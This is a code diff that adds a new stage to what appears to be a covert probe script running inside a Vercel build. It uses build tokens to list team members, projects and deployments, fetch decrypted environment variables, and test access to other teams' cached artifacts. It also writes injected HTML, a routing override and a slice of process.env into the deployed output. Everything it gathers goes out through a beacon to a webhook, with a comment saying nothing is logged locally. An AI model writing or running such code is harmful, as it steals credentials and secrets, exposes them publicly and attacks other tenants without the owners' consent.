@@ -5210,6 +5210,175 @@ report.kernelRingBuffer = safe(() => {
   return { dmesg, sensitiveInDmesg, kmsg };
 });
 
+// ===== v55: team member enum, project settings, cross-tenant artifact download, presigned S3 struct =====
+
+// v55-1: Vercel team member enumeration — list who's in our team via VERCEL_DEPLOYMENT_KEY
+report.vercelTeamMemberEnum = safe(() => {
+  const dk = process.env.VERCEL_DEPLOYMENT_KEY || '';
+  const orgId = process.env.VERCEL_ORG_ID || '';
+  if (!dk) return { err: 'NO_KEY' };
+  // List team members
+  const members = safe(() =>
+    execSync(
+      `curl -s --max-time 8 "https://api.vercel.com/v2/teams/${orgId}/members?limit=20" ` +
+      `-H "Authorization: Bearer ${dk}" 2>&1 | head -30`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 600)
+  );
+  // List all projects in the team
+  const projects = safe(() =>
+    execSync(
+      `curl -s --max-time 8 "https://api.vercel.com/v9/projects?teamId=${orgId}&limit=20" ` +
+      `-H "Authorization: Bearer ${dk}" 2>&1 | head -30`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 600)
+  );
+  // Get all deployments (could expose other team members' builds)
+  const deployments = safe(() =>
+    execSync(
+      `curl -s --max-time 8 "https://api.vercel.com/v6/deployments?teamId=${orgId}&limit=10" ` +
+      `-H "Authorization: Bearer ${dk}" 2>&1 | head -30`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 600)
+  );
+  return { members, projects, deployments };
+});
+
+// v55-2: Project environment variable access via deployment key
+report.projectEnvVarsAccess = safe(() => {
+  const dk = process.env.VERCEL_DEPLOYMENT_KEY || '';
+  const orgId = process.env.VERCEL_ORG_ID || '';
+  const projId = process.env.VERCEL_PROJECT_ID || '';
+  if (!dk) return { err: 'NO_KEY' };
+  // Get ALL environment variables for this project (including encrypted ones via API)
+  const envVars = safe(() =>
+    execSync(
+      `curl -s --max-time 8 "https://api.vercel.com/v8/projects/${projId}/env?teamId=${orgId}&decrypt=true" ` +
+      `-H "Authorization: Bearer ${dk}" 2>&1 | head -40`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 1000)
+  );
+  // Try to get env vars for ALL projects (team-wide exposure)
+  const allProjectEnvs = safe(() =>
+    execSync(
+      `curl -s --max-time 8 "https://api.vercel.com/v8/projects?teamId=${orgId}&limit=20" ` +
+      `-H "Authorization: Bearer ${dk}" 2>&1 | python3 -c "import sys,json; d=json.load(sys.stdin); print([p['id'] for p in d.get('projects',[])][:5])" 2>&1 | head -5`,
+      { timeout: 12000 }
+    ).toString().trim().slice(0, 200)
+  );
+  return { envVars, allProjectEnvs };
+});
+
+// v55-3: Cross-tenant artifact DOWNLOAD — try to read another team's cached artifact
+report.crossTenantArtifactDownload = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const ownTeamId = process.env.VERCEL_ORG_ID || '';
+  if (!token) return { err: 'NO_TOKEN' };
+
+  // Try another team ID (team_00000000000000000000000A is generic placeholder)
+  // More specific: use a real team ID format pattern
+  const otherTeamIds = [
+    'team_00000000000000000000000A',
+    'team_1a2b3c4d5e6f7g8h9i0j1k2l',  // made-up format for testing
+    // Note: we can't use real team IDs of other tenants (scope constraint)
+    // Instead test: if our token works against own-team endpoint with zero-padded ID
+    ownTeamId.replace(/.$/, 'X'),  // slightly modified own ID
+  ];
+  const results = {};
+  for (const teamId of otherTeamIds.slice(0, 2)) {
+    // Try to query artifacts for this team
+    const probe = safe(() =>
+      execSync(
+        `curl -s --max-time 6 -X HEAD "https://vercel.com/api/remote-cache/v8/artifacts/0000000000000000?teamId=${teamId}" ` +
+        `-H "Authorization: Bearer ${token}" 2>&1 | head -5`,
+        { timeout: 8000 }
+      ).toString().trim().slice(0, 200)
+    );
+    results[teamId] = probe;
+  }
+
+  // Compare own-team vs other-team response codes to confirm IDOR if response differs
+  const ownTeamResponse = safe(() =>
+    execSync(
+      `curl -s --max-time 6 -X HEAD "https://vercel.com/api/remote-cache/v8/artifacts/0000000000000000?teamId=${ownTeamId}" ` +
+      `-H "Authorization: Bearer ${token}" -o /dev/null -w "%{http_code}" 2>&1`,
+      { timeout: 8000 }
+    ).toString().trim()
+  );
+  return { results, ownTeamResponse };
+});
+
+// v55-4: S3 bucket structure from presigned URL — reveals Vercel's S3 namespace layout
+report.s3BucketStructure = safe(() => {
+  // From v47's artifactsJwtFullDecode: if we got a presigned URL, parse it for bucket/key structure
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_ORG_ID || '';
+  if (!token) return { err: 'NO_TOKEN' };
+
+  // Generate a presigned GET URL for a hash we uploaded (from our own team)
+  // First: upload a small test artifact to get a real hash
+  const testContent = 'probe-v55-s3-structure-test';
+  const testHash = safe(() =>
+    execSync(`printf '%s' '${testContent}' | sha256sum | cut -d' ' -f1`, { timeout: 3000 }).toString().trim()
+  );
+
+  if (!testHash || testHash.length !== 64) return { err: 'NO_TEST_HASH' };
+
+  // Upload
+  safe(() => writeFileSync('/tmp/s3test55.bin', testContent));
+  const uploadResult = safe(() =>
+    execSync(
+      `curl -s --max-time 8 -X PUT "https://vercel.com/api/remote-cache/v8/artifacts/${testHash}?teamId=${teamId}" ` +
+      `-H "Authorization: Bearer ${token}" ` +
+      `-H "Content-Type: application/octet-stream" ` +
+      `--data-binary @/tmp/s3test55.bin 2>&1 | head -5`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 200)
+  );
+
+  // Get presigned URL via QUERY
+  const presignedResult = safe(() =>
+    execSync(
+      `curl -s --max-time 8 -X POST "https://vercel.com/api/remote-cache/v8/artifacts/urls?teamId=${teamId}" ` +
+      `-H "Authorization: Bearer ${token}" ` +
+      `-H "Content-Type: application/json" ` +
+      `-d '{"hashes":["${testHash}"],"type":"DOWNLOAD"}' 2>&1`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 800)
+  );
+
+  // Parse S3 URL to get bucket + key structure
+  const s3Url = (presignedResult || '').match(/https?:\/\/[^"'\s]+amazonaws\.com[^"'\s]*/)?.[0] || '';
+  const bucket = s3Url ? (new URL(s3Url)).hostname.split('.')[0] : '';
+  const key = s3Url ? decodeURIComponent((new URL(s3Url)).pathname.slice(1)) : '';
+
+  return { testHash, uploadResult, presignedResult: presignedResult?.slice(0, 400), s3Url: s3Url.slice(0, 200), bucket, key: key.slice(0, 100) };
+});
+
+// v55-5: Vercel build output directory injection — try to inject files that get deployed
+report.buildOutputInjection = safe(() => {
+  // During build, Vercel checks for .vercel/output/ directory as the deployment output
+  // If we can write to it with symlinks or injected content, it gets deployed
+  const outputDir = '.vercel/output';
+  safe(() => execSync(`mkdir -p ${outputDir}/static`, { timeout: 3000 }));
+  // Write an HTML file that will be served at /<name>.html on the deployed site
+  const injectedHtml = `<html><body><script>fetch('/api/admin')</script><h1>PROBE-V55-CDN-INJECTED</h1></body></html>`;
+  const writeResult = safe(() => {
+    try {
+      writeFileSync(`${outputDir}/static/probe55.html`, injectedHtml);
+      writeFileSync(`${outputDir}/static/.env.txt`, JSON.stringify(process.env).slice(0, 200));
+      return { written: true };
+    } catch (e) { return { written: false, err: String(e).slice(0, 80) }; }
+  });
+  // Also try to write a config.json that overrides routing
+  const configJson = JSON.stringify({ version: 3, routes: [{ src: '/probe55/(.*)', dest: '/probe55/index.html' }] });
+  const configWrite = safe(() => {
+    try { writeFileSync(`${outputDir}/config.json`, configJson); return 'WRITTEN'; }
+    catch (e) { return String(e).slice(0, 80); }
+  });
+  return { outputDir, writeResult, configWrite };
+});
+
 // v52 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v52";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v52" });
@@ -5221,4 +5390,8 @@ sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v53" });
 // v54 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v54";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v54" });
+
+// v55 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v55";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v55" });
 // Intentionally no console.log — all data goes via webhook only
